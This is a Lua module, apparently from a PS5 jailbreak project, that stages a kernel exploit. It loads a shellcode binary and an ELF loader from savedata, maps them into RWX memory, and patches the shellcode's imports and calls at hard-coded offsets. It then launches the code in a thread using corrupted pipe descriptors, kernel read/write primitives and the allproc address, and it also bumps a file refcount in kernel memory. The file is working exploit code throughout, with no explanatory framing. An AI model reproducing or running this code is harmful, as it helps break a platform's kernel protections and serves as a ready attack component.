-- https://github.com/ufm42/kexp/tree/test

local KEXP_SIZE = 18912
local kexp_patch = {
    resolver_calls = { 0x1c, 0x23 },
    getpid_call_at = 0x10f1,
    getpid_tail_at = 0x10fb,
    getpid_tail = { 0x48, 0x89, 0x45, 0xd0, 0x31, 0xc0 },
    getpid_pad_from = 0x1101,
    getpid_pad_to = 0x1106,
    log_calls = { 0x126d, 0x12ad, 0x3bc2 },
    libkernel_imports = {
        { 0x48b0, "sceKernelSendNotificationRequest" },
        { 0x48b8, "sysctlbyname" },
        { 0x48c0, "pthread_create" },
        { 0x48c8, "pthread_join" },
    },
    libc_imports = {
        { 0x48d0, "malloc" },
        { 0x48d8, "free" },
        { 0x48e0, "memcpy" },
        { 0x48e8, "memset" },
        { 0x48f0, "strcmp" },
        { 0x48f8, "memcmp" },
        { 0x4900, "vsnprintf" },
    },
}

local function savedata_path(name)
    return string.format("/mnt/sandbox/%s_000/savedata0/%s", get_title_id(), name)
end

-- single open instead of a separate file_exists() + file_read() pair.
local function read_payload_file(path)
    local f = io.open(path, "rb")
    if not f then return nil end
    local data = f:read("*all")
    f:close()
    return data
end

local function write_nop(addr, count)
    for i = 0, count - 1 do memory.write_byte(addr + i, 0x90) end
end

local function patch_imports(ctx, entry_addr, size)
    if size ~= KEXP_SIZE then
        ctx.report("Kernel", "unexpected shellcode size " .. size .. ", skipping import patch")
        return false
    end
    for _, offset in ipairs(kexp_patch.resolver_calls) do
        if memory.read_byte(entry_addr + offset):tonumber() ~= 0xe8 then
            ctx.report("Kernel", "resolver call at " .. ctx.hex(offset) .. " does not match, aborting patch")
            return false
        end
    end

    for _, offset in ipairs(kexp_patch.resolver_calls) do
        write_nop(entry_addr + offset, 5)
    end

    local getpid_addr = dlsym(ctx.libkernel_handle, "getpid")
    memory.write_byte(entry_addr + kexp_patch.getpid_call_at, 0x48)
    memory.write_byte(entry_addr + kexp_patch.getpid_call_at + 1, 0xb8)
    memory.write_qword(entry_addr + kexp_patch.getpid_call_at + 2, getpid_addr)
    for i, byte in ipairs(kexp_patch.getpid_tail) do
        memory.write_byte(entry_addr + kexp_patch.getpid_tail_at + i - 1, byte)
    end
    write_nop(entry_addr + kexp_patch.getpid_pad_from, kexp_patch.getpid_pad_to - kexp_patch.getpid_pad_from)

    for _, entry in ipairs(kexp_patch.libkernel_imports) do
        memory.write_qword(entry_addr + entry[1], dlsym(ctx.libkernel_handle, entry[2]))
    end
    for _, entry in ipairs(kexp_patch.libc_imports) do
        memory.write_qword(entry_addr + entry[1], dlsym(ctx.libc_handle, entry[2]))
    end

    for _, offset in ipairs(kexp_patch.log_calls) do
        if memory.read_byte(entry_addr + offset):tonumber() == 0xe8 then
            write_nop(entry_addr + offset, 5)
        end
    end

    return true
end

local function launch(ctx)
    ctx.restore_thread_attributes()

    if not ctx.kbase or not ctx.proc_fd_addr then
        ctx.report("Kernel", "kernel r/w is incomplete")
        return false
    end

    local allproc = ctx.kaddr(ctx.off.allproc)
    if bit32.band(allproc.h, 0xffff0000) ~= 0xffff0000 then
        ctx.report("Kernel", "invalid allproc address " .. ctx.hex(allproc))
        return false
    end

    local elfldr_path = savedata_path("elfldr-ps5.elf")
    local elfldr_data = read_payload_file(elfldr_path)
    if not elfldr_data then
        ctx.report("Kernel", elfldr_path .. " does not exist")
        return false
    end
    local elfldr_ptr = lua.resolve_value(elfldr_data)

    local kexp_path = savedata_path("kexp.bin")
    local kexp_data = read_payload_file(kexp_path)
    if not kexp_data then
        ctx.report("Kernel", kexp_path .. " does not exist")
        return false
    end
    local kexp_aligned_size = align_to(#kexp_data, PAGE_SIZE)

    local exec_fd = syscall.jitshm_create(0, kexp_aligned_size, ctx.prot_rwx)
    local entry_addr = syscall.mmap(0, kexp_aligned_size, ctx.prot_rwx, 0, exec_fd, 0)
    local kexp_addr = lua.resolve_value(kexp_data)
    memory.memcpy(entry_addr, kexp_addr, #kexp_data)

    if not patch_imports(ctx, entry_addr, #kexp_data) then
        return false
    end

    local args = memory.alloc(0x28)
    memory.write_dword(args + 0x00, ctx.master.read_fd)
    memory.write_dword(args + 0x04, ctx.master.write_fd)
    memory.write_dword(args + 0x08, ctx.victim.read_fd)
    memory.write_dword(args + 0x0c, ctx.victim.write_fd)
    memory.write_qword(args + 0x10, allproc)
    memory.write_qword(args + 0x18, elfldr_ptr)
    memory.write_qword(args + 0x20, #elfldr_data)

    local pthread_create = fcall(dlsym(ctx.libkernel_handle, "scePthreadCreate"))
    local pthread_join = fcall(dlsym(ctx.libkernel_handle, "scePthreadJoin"))

    kernel.addr.curproc = ctx.curproc
    kernel.addr.allproc = allproc
    kernel.read_buffer = function(addr, len)
        local buf = memory.alloc(len)
        ctx.kread_fast(addr, len, buf)
        return memory.read_buffer(buf, len)
    end
    kernel.write_buffer = function(addr, buf)
        ctx.kwrite_fast(addr, #buf, buf)
    end
    update_kernel_offsets()

    local spawn_err
    run_with_ps5_syscall_enabled(function()
        local thr_handle_addr = memory.alloc(8)
        local created = pthread_create(thr_handle_addr, 0, entry_addr, args):tonumber()
        if created ~= 0 then
            spawn_err = "pthread_create returned " .. ctx.hex(created)
            return
        end
        local thr_handle = memory.read_qword(thr_handle_addr)
        ctx.on_handoff()

        local result_addr = memory.alloc(8)
        local joined = pthread_join(thr_handle, result_addr):tonumber()
        if joined ~= 0 then
            spawn_err = "pthread_join returned " .. ctx.hex(joined)
            return
        end
        ctx.stage("kexp: elfldr returned " .. ctx.hex(memory.read_qword(result_addr)))
    end)

    if spawn_err then
        ctx.report("Kernel", spawn_err)
        return false
    end

    return true
end

local function bump_refcount(file_addr, kread32, kwrite32)
    local rv, count = kread32(file_addr + 0x28)
    return rv == 0 and kwrite32(file_addr + 0x28, count + 0x100) == 0
end

return {
    launch = launch,
    bump_refcount = bump_refcount,
}
